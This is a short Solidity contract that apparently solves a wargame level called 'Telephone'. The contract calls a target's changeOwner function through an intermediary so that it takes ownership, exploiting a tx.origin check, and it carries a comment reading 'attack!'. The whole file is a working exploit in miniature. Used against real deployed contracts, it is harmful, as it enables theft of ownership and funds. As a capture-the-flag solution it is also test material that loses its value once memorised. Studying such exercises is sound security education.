// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract AttackTelephone {
  Telephone public telephoneContract;

  constructor(address _address) public {
    telephoneContract = Telephone(_address);
  }

  // 攻擊！
  function attack() public {
    telephoneContract.changeOwner(msg.sender);
  }
}